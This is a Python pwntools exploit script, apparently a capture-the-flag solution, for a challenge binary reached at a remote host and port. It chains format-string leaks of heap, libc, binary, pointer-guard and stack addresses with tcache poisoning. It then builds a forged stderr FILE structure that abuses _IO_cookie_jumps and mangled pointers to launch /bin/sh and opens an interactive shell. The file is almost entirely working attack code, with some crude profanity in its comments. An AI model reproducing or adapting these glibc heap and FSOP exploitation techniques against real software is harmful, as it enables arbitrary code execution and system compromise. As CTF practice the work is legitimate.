from pwn import *
context.log_level = 'debug'
context.binary = binary = './chall'
elf = ELF(binary)
libc = ELF("./libc.so.6")
host, port = '34.118.61.99', 10072
def newp():
    if args.REMOTE:
        return remote(host, port)
    return process(elf.path)

def send_format(size, formatu, args):
    p.sendlineafter(b'size\n', str(size).encode())
    p.sendlineafter(b'format\n', formatu)
    p.sendlineafter(b'args?\n', str(len(args)).encode())
    print(str(len(args)))
    for i in range(len(args)):
        p.sendline(args[i])

def send_format_no_args(size, formatu):
    p.sendlineafter(b'size\n', str(size).encode())
    p.sendlineafter(b'format\n', formatu)
    p.sendlineafter(b'args?\n', b'0')

p = newp()

send_format(18, b'%ZZZZ%skib%skibAZ', [b'A', b'18446744073709551615', b'18446744073709551615'])
for i in range(2):
    p.recvuntil(b'6744073')
caca = u64(p.recv(5) + b'\x00\x00\x00')
print(hex(caca))
heap_base = caca << 12
print(hex(heap_base))


send_format(0x420 + 21, b'D' * 0x420 + b'%skib%skib%skib%skib', [b'A', b'1111111', b'1'])

unsortedbin_loc = heap_base + 0x2f8
fake_0x31_size = heap_base+0x718 - 8
send_format(0x18, b'A'*11 + b'%oops%oops' + b'\x00', [str(unsortedbin_loc).encode(), str(fake_0x31_size).encode()])
p.read(11)
libc_leak = u64(p.read(6).ljust(8, b'\x00'))
print(hex(libc_leak))
libc_base = libc_leak - 0x210b20

binary_addr_location = libc_base + 0x20fe10
send_format(0x70, b'A' * 0x25 + b'%oops', [str(binary_addr_location).encode()])
p.recvuntil(b'A' * 0x25)
leak = u64(p.recv(6) + b'\x00' * 2)
print(hex(leak))

bin_base = leak - 0x4020
print(hex(bin_base))


if not args.REMOTE:
    gdb.attach(p, gdbscript='''
    brva 0x1A6A
    b *__assert_fail_base+0x277
    b *__fxprintf
    b *fflush
    b *__printf_buffer_to_file_done+0xd0
    ''')



    tls_bam_cham = int(input('TLS? '),16)
else:
    tls_bam_cham = libc_base - 0x3000

print(hex(tls_bam_cham))

send_format(0x70, b'A' * 0x25 + b'%oops', [str(tls_bam_cham + 0x770).encode()])
p.recvuntil(b'A' * 0x25)
pula_mea_in_gura_ta = u64(p.recv(8))
print(hex(pula_mea_in_gura_ta))
# p.interactive()
# exit()
# bin_base = leak - 0x4020
# print(hex(bin_base))





environ_location = libc_base + 0x217e28

send_format(0x80, b'B'*(0x38-16) + b'%oops%skib', [str(environ_location).encode()])
p.recvuntil(b'B' * (0x38-16))
leak = u64(p.recv(6) + b'\x00' * 2)

stack_buffer_location = leak - 0x1e8
print(f"SA MA FUT {hex(stack_buffer_location)}")
tcachebin_0x30_chunk_loc = heap_base+0x700
caca = heap_base+0x200

loc1 = stack_buffer_location - 6
loc2 = stack_buffer_location - 6 + 0xf
byte = bin_base + 0x4120
byte = byte ^((heap_base+0x730)>>12)

stderr = bin_base+0x4040
stderr = stderr ^((heap_base+0x2c0)>>12)

print(hex(byte))
send_format(0x458, b'X'*0x3e8 + b'%oops%oops' + b'\x00'*8 + b'Z'*15 + b'\x00' +  b'\x41' + b'\x00'*7 + p64(stderr), [str(loc1).encode(), str(loc2).encode()])

# Make double tcachebin 0x30
send_format(0x50, b'A'*0x18 + b'%ZZZZ', [b'1'])

# Overwrite tcachebin 0x30 fd
loc1 = stack_buffer_location + 0x10
loc2 = stack_buffer_location + 27
print(f"sa mi bag caca in r0 dev caca {hex(stderr)}")
send_format(0x60, b'H'*14 + b'%oops%oops' + b'\x00'*8 + b'Z'*10 + p64(0x31) + p64(byte), [str(loc1).encode(), str(loc2).encode()])


#Error
send_format(0x80, b'B'*0x18 + b'%ZZZZ%skib', [b'1'])

# Fake stderr
# Punem ogramada de ZZZZ uri doar ca sa se faca chunk de 0x40
libc.address = libc_base
fake_stderr = stack_buffer_location-0x376 + 0x100 - 0x300 + 0x90 + 6 + 3 - 1 + 8 + 6 + 8

cox = p64(0x00000000fbad2087) + p64(libc_base + 0x211563) * 7 + p64(libc_base + 0x211564) + p64(0) * 4 + p64(libc_base + 0x2115c0) + p64(2) + p64(0xffffffffffffffff) + p64(0)
cox += p64(libc_base + 0x2127a0) + p64(0xffffffffffffffff) + p64(0) + p64(libc_base + 0x2106e0) + p64(0) * 2 + p64(libc_base + 0x2114c0) + p64(0) * 3 + p64(libc_base+0x20efd0)

def PTR_MANGLE(ptr, ptr_guard, shift, bit_size):
    xor = ptr ^ ptr_guard
    return rol(xor, shift, bit_size)

_IO_cookie_jumps = libc_base + 0x20f438 - 0x40 - 0x38
fakeIO_addr = fake_stderr
pl = flat({
    # fake stderr & _IO_cookie_file  
    0: {  #结构体的地址
        0x0:  0,    # _flag
        0x20: 0,    # _IO_write_base
        0x28: 1,    # _IO_write_ptr 
        0x38: 0,    # _IO_buf_base
        0x40: 0,    # _IO_buf_end
        0x68: 0,    # _chain
        0x88: heap_base+0x2000,    # _lock
        0xc0: 0,    # mode 伪造的
        0xd8: _IO_cookie_jumps+0x40,    # vtable
        0xe0: fakeIO_addr + 0x100,   # rdi
        # mov rdx, [rdi + 8]; mov [rsp], rax; call [rdx + 0x20]; 
        0xf0: PTR_MANGLE(libc_base + 0x000000000005c110, pula_mea_in_gura_ta, 0x11, 64),
    },
}, filler='\0')

fsop_chunk_payload = pl + b'\x00' * 8 +  b'/bin/sh\x00'





#payload = cyclic(0x267 + 128 + 1, n=8) + cox
payload = cyclic(128 + 6 - 10, n=8) + b'B' * 2 + p64(fake_stderr - 0x100) +  b'A' * 8 + fsop_chunk_payload + b'A' * 0x30
# - 0xa -0x300+3+0xa0

send_format(0x5dc, b'%ZZZZ'*10 + p64(fake_stderr) + payload, [b'1'])


#sleep(1)
#send_format(0x20, b'A'*10, [b'1'])


p.interactive()